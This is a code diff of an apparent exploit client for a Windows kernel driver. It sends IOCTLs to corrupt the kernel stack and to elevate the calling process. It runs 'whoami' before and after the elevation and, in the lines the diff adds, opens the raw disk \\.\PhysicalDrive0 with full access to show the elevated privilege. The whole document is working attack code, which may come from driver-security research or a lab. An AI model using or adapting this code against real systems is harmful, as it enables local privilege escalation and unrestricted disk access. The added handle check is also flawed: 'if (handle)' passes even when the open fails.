@@ -81,20 +81,27 @@ int main()
 		{
 			ctlcode = IO_CORRUPT_STACK;
 			printf("[+] Stack corruption\n");
-			printf("Waiting for target proc...\n");
+			printf("[+] Waiting for target proc...\n");
 			break;
 
 		}
 		else if (code == 4)
 		{
 			ctlcode = IO_ELEVATE_PROCESS;
-			printf("[+] Elevate process\n");
+			printf("[+] Elevate process\n\n");
 
 			DWORD pid = GetCurrentProcessId();
 
 			printf("whoami result #1: ");
 			system("whoami");
 
+			HANDLE handle = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
+
+
+			if (handle == INVALID_HANDLE_VALUE)
+			{
+				printf("Failed to create handle\n\n");
+			}
 
 			if (!DeviceIoControl(hDevice, ctlcode, &pid, sizeof(pid), NULL, 0, NULL, NULL))
 			{
@@ -107,6 +114,15 @@ int main()
 			
 			printf("whoami result #2: ");
 			system("whoami");
+
+			handle = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
+
+			if (handle)
+			{
+				printf("Created handle\n\n");
+			}
+
+			CloseHandle(handle);
 
 			while (true)
 			{
